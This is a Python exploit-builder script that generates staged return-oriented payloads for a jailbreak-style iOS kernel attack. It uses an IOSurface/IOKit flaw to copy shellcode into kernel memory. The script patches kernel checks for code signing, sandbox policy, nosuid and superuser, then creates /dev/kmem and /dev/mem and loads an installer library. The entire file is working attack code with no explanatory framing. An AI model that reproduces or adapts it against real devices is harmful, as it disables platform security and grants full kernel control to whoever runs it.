#!/opt/local/bin/python2.6
from world1 import *
kern = cfg['#kern']

def make_stage2(init_regs, is_boot, heapaddr):
    init(*init_regs)
    data, dataptr = stackunkpair()
    matching, matchingptr = stackunkpair()
    baseptr = ptrI(0)
    connect = ptrI(0)
    surface = ptrI(0)
    surface0 = ptrI(0)
    zero = ptrI(0)

    if not is_boot: make_avail()

    #funcall('_ptrace', 31, 0, 0, 0) # PT_DENY_ATTACH

    # These *are* mapped before being loaded, but initializers are not called -> crash
    funcall('_dlopen', ptr('/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface', True), 0)
    funcall('_dlopen', ptr('/System/Library/Frameworks/IOKit.framework/IOKit', True), 0)

    if is_boot:
        
        # This is for debugging.
        #q = ptr('\0\0\0\0')
        #store_r0_to(q)
        #funcall('_sysctlbyname', ptr('net.inet.ipsec.ah_offsetmask', True), 0, 0, q, 4)
        #make_avail()
    
        timespec = ptr('\0'*12)
        funcall('_IOKitWaitQuiet', 0, timespec)
    
    funcall('_IOServiceMatching', ptr(str(kern['rgbout']), True))
    store_r0_to(matchingptr)

    funcall('_mach_task_self')
    task, taskptr = stackunkpair()
    store_r0_to(taskptr)
    
    funcall('_IOServiceGetMatchingService', 0, matching)

    #funcall('_CFShow', None)
    #funcall('_abort')

    service, serviceptr = stackunkpair()
    store_r0_to(serviceptr)
    
    funcall('_IOServiceOpen', None, task, 0, connect)

    alloc_size, w = kern['adjusted_vram_baseaddr']
    r7s = kern['vram_baseaddr']
     
    h = kern['e1']
    
    scratch = kern['scratch'] + 0x100

    patches = [(kern[combo], kern[combo + '_to']) for combo in ['patch1', 'patch3', 'patch4', 'patchkmem0', 'patchkmem1', 'patch_cs_enforcement_disable', 'patch_proc_enforce', 'patch_nosuid']]

    # Make an IOSurface.
    bytes_per_row = (w * 4) & 0xffffffff
    my_plist = ptr('''
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
        <key>IOSurfaceAllocSize</key>
        <integer>%d</integer>
        <key>IOSurfaceBufferTileMode</key>
        <false/>
        <key>IOSurfaceBytesPerElement</key>
        <integer>4</integer>
        <key>IOSurfaceBytesPerRow</key>
        <integer>%d</integer>
        <key>IOSurfaceHeight</key>
        <integer>%d</integer>
        <key>IOSurfaceIsGlobal</key>
        <true/>
        <key>IOSurfaceMemoryRegion</key>
        <string>PurpleGfxMem</string>
        <key>IOSurfacePixelFormat</key>
        <integer>1095911234</integer>
        <key>IOSurfaceWidth</key>
        <integer>%d</integer>
    </dict>
    </plist>'''.replace('    ', '').replace('\n', '') % (alloc_size, bytes_per_row, h, w))

    funcall('_CFDataCreate', 0, my_plist, len(my_plist))
    store_r0_to(dataptr)
    kCFPropertyListImmutable = 0
    funcall('_CFPropertyListCreateFromXMLData', 0, data, kCFPropertyListImmutable, 0)
    funcall('_IOSurfaceCreate', None)
    store_r0_to(surface0)

    funcall('_IOSurfaceLookup', kern['root_ios_id'])
    store_r0_to(surface)

    funcall('_IOSurfaceLock', surface, 0, 0, load_r0=True)
    funcall('_IOSurfaceGetBaseAddress', surface, load_r0=True)
    store_r0_to(baseptr)

    #funcall('_wmemset', None, kern['e0'], alloc_size / 4)
    
    js = ptr(struct.pack('QQ', 0, 6))
    
    funcall('_IOSurfaceGetID', surface0, load_r0=True)
    store_r0_to(js)

    if not is_boot:
        patches.append((kern['patch_suser'], kern['patch_suser_to']))
        patches.append((kern['mac_policy_list'] + 8, 0))
        patches.append((kern['mac_policy_list'] + 12, 0))

    sandstuff = open('../../sandbox/sandbox-mac-replace.bin').read()
    goop = open('goop.bin').read()
    sandstuff = sandstuff[:-16] + struct.pack('IIII', kern['strncmp'], kern['vn_getpath'], kern['mpo_vnode_check_open'], kern['mpo_vnode_check_access'])
    sandbase = scratch + 0x6c + len(goop) + 8*(len(patches) + 3)
    accessbase = sandbase + sandstuff.find(struct.pack('I', 0xacce5)) + 4
    copysize = sandbase + len(sandstuff) - scratch

    patches.append((kern['mpo_vnode_check_open_ptr'], sandbase | 1))
    patches.append((kern['mpo_vnode_check_access_ptr'], accessbase | 1))

    # R7, PC, dest is either sp + 0x34 or sp + 0x64
    # [0x38] = [0x68] = PC (scratch | 1)
    # [0x3c] = [0x6c] = scratch
    data = struct.pack('IIIIIII',
        # SP is here (0) during the bcopy
        copysize, # size
        # Scratch is copied from  here (4)
        ## The below is used as copied into scratch.
        0, 0, 0, # R8, R10, R11
        0, 0, 0, # R4, R5, R6
    )

    assert len(data) == 0x1c
    data += struct.pack('IIIIIIII',
        0, # R7 or R8
        (scratch + 0x6c) | 1, # PC or R10
        0, # R11
        0, 0, 0, 0, (scratch + 0x6c) | 1, # R4-R7, PC
    )
    
    assert len(data) == 0x3c
    #data += '\xee' * (0x3c - len(data))
    data += struct.pack('I', scratch)
    data += '\x99' * (0x4c - len(data))
    data += struct.pack('IIIIIIII', # ipt2g
        0, # R8
        0, # R10
        0, # R11
        0, 0, 0, 0, (scratch + 0x6c) | 1, # R4-R7, PC
    )
    assert len(data) == 0x6c
    #data += '\xee' * (0x6c - len(data))
    data += struct.pack('I', scratch)
    
    # this is 0x70 aka 4 + 0x6c
    data += goop[:-16]
    data += struct.pack('IIII',
        kern['current_thread'],
        kern['ipc_kobject_server_start'],
        kern['ipc_kobject_server_end'],
        len(patches)
    )

    for p, q in patches:
        data += struct.pack('II', q, p)

    data += struct.pack('II', 0xdead0001, 0xf00d0001) # just in case

    assert len(data) == 4 + sandbase - scratch
    data += sandstuff

    assert len(data) == 4 + copysize
    
    while len(data) % 4 != 0: data += '\0'

    open('/tmp/data', 'w').write(data[4:])

    #o = 0xc0458216 - scratch - 8 + 2 + 192; print '--', data[o+4:o+8].encode('hex')
    
    intro = struct.pack('II',
        #kern['e1']+4, # PC
        scratch + 0x18, # R7
        kern['e2'], # PC
    )

    print 'scratch=%08x copysize=%08x' % (scratch, copysize)

    pdata = ptr(intro + data)

    for r7 in r7s:
        load_r0_from(baseptr)
        add_r0_const(w - r7)
        funcall('_memcpy', None, pdata, len(intro) + len(data))

    funcall('_IOSurfaceUnlock', surface, 0, 0, load_r0=True)
    #funcall('_abort')
    funcall('_IOConnectCallScalarMethod', connect, 1, js, 2, 0, 0, load_r0=True)
    #print 'imo, IOConnectCallScalarMethod = %x' % syms['_IOConnectCallScalarMethod']

    if not is_boot:
        funcall('_setuid', 0)
    
    funcall('_mknod', ptr('/dev/mem', True),  020600, 0x3000000)
    funcall('_mknod', ptr('/dev/kmem', True), 020600, 0x3000001)


    if not is_boot:
        kmem_ptr = ptrI(0)
        funcall('_open', ptr('/dev/kmem', True), 2) # O_RDWR
        store_r0_to(kmem_ptr)
        funcall('_pwrite', kmem_ptr, ptrI(kern['patch_suser_orig']), 4, kern['patch_suser'], 0, load_r0=True)
        funcall('_close', kmem_ptr, load_r0=True)

    funcall('_CFRelease', surface, load_r0=True)
    funcall('_CFRelease', surface0, load_r0=True)
    funcall('_IOServiceClose', connect, load_r0=True)
    funcall('_IOObjectRelease', service)

    if is_boot:
        
        funcall('_sysctlbyname', ptr('security.mac.proc_enforce', True), 0, 0, zero, 4)
    
        launchd = ptr('/sbin/launchd', True)
        argp = ptrI(launchd, 0)
        envp = ptrI(ptr('DYLD_INSERT_LIBRARIES=', True), 0)
        funcall('_execve', launchd, argp, envp)
        funcall('_abort')
        #funcall('_perror', ptr('U fail!', True))
    else:
       
        dylib = open('../../installui/installui.dylib').read()

        O_WRONLY = 0x0001
        O_CREAT  = 0x0200
        O_TRUNC  = 0x0200

        tmpptr = ptr('/tmp/installui.dylib', True)

        fd, fdptr = stackunkpair()
        funcall('_open', tmpptr, O_WRONLY | O_CREAT | O_TRUNC, 0644)
        store_r0_to(fdptr)
        funcall('_write', None, ptr(dylib), len(dylib))
        funcall('_close', fd)

        RTLD_LAZY = 0x1
        sym, symptr = stackunkpair()
        funcall('_dlopen', tmpptr, RTLD_LAZY)
        funcall('_dlsym', None, ptr('iui_go', True))
        store_r0_to(symptr)
        #load_r0_from(connect)
        one = open('one.dylib').read()
        print 'one is %d bytes' % len(one)
        funcall(sym, 0xdeadbeed, ptr(one), len(one))

    return finalize(heapaddr)

def make_stage1():
    init('R8', 'R10', 'R11', 'R4', 'R5', 'R6', 'R7', 'PC')
    print 'len(stage2) = %d' % len(stage2)
    assert len(stage2) < 0x10000
    funcall('_mmap', mmap_addr, stackspace + len(stage2) + 4, 3, 0x1012, 0, 0, 0)
    # iPad1,1_3.2: -960
    # iPhone3,1_4.0: -964
    load_r0_base_sp_off(cache['magic_offset']) # trial and error
    store_r0_to(mmap_addr + stackspace + len(stage2))
    add_r0_const(0xdeadbeef) # Not a placeholder.  This is the length of the original program, which we want to skip. outcff handles this

    funcall('_bcopy', None, mmap_addr + stackspace, len(stage2))
    set_sp(mmap_addr + stackspace)
    heapadd(0xf00df00d) # searched for

    return finalize()

if __name__ == '__main__':
    if sys.argv[1] == '--initial':
        mmap_addr = 0x09000000
        stackspace = 1024*1024
        stage2 = make_stage2(['R7', 'PC'], False, mmap_addr + stackspace)
        stage2 = stage2.replace(struct.pack('I', 0xdeadbeed), struct.pack('I', mmap_addr + stackspace + len(stage2)))
        stage1 = make_stage1()

        print len(stage1)/4, '/ 48' # should be (a few) less than 48

        open('../../cff/stage1.txt', 'wb').write(stage1)
        open('../../cff/stage2.txt', 'wb').write(stage2)

    elif sys.argv[1] == '--boot':
        heapaddr = 0x11130000
        stage2boot = make_stage2(['R4', 'R5', 'R6', 'R7', 'PC'], True, heapaddr)
        open('stage2boot.txt', 'wb').write(stage2boot)
    else:
        print 'usage: zero.py --initial | --boot'

